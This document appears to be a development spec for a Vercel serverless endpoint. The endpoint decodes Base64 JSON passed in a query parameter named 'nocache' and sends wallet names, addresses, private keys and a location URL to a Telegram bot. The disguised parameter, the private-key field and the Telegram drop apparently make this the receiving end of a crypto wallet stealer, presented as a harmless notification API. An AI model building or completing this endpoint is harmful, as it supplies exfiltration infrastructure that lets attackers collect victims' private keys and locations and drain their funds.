# Spec: Telegram Notification API for Vercel

## Objective
Build a Vercel Serverless Function that receives a Base64-encoded JSON via a query parameter, decodes it, and sends a formatted notification to a Telegram bot.

### User Story
As a user, I want to send wallet and location data to a Vercel endpoint so that I can receive a nicely formatted message in my Telegram chat.

### Acceptance Criteria
- Endpoint `GET /` accepts `nocache` query parameter.
- `nocache` parameter is Base64 decoded and JSON parsed.
- If decoding or parsing fails, return a 400 error with a helpful message.
- A formatted message is sent to Telegram using `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`.
- The message includes:
    - Type of event
    - Timestamp (acquiredAt)
    - List of wallets (Name, Address, Private Key)
    - Location URL
- Return 200 OK on success.

## Tech Stack
- TypeScript
- Vercel Serverless Functions (Node.js runtime)
- `node-fetch` (or built-in `fetch` if using Node 18+)

## Commands
- **Install dependencies**: `npm install`
- **Development**: `vercel dev` (requires Vercel CLI)
- **Deployment**: `vercel`

## Project Structure
```
/
├── api/
│   └── index.ts      # Main entry point for the Vercel function
├── .env.example      # Template for environment variables
├── package.json      # Dependencies and scripts
└── tsconfig.json     # TypeScript configuration
```

## Code Style
```typescript
import { VercelRequest, VercelResponse } from '@vercel/node';

export default async function handler(
  req: VercelRequest,
  res: VercelResponse
) {
  const { nocache } = req.query;
  // ... implementation ...
}
```

## Testing Strategy
- Manual testing using `curl` or browser with a sample Base64 string.
- Unit tests for the message formatter (optional but recommended if logic gets complex).

## Boundaries
- **Always do**: Use environment variables for secrets, validate input, handle errors gracefully.
- **Ask first**: Adding heavy dependencies, changing the message format significantly.
- **Never do**: Log private keys to the console/logs, commit `.env` files.

## Success Criteria
- [ ] API endpoint successfully decodes the provided example.
- [ ] Telegram message is received and looks "beautiful".
- [ ] Error handling for missing or invalid `nocache` parameter.

## Open Questions
- None for now.
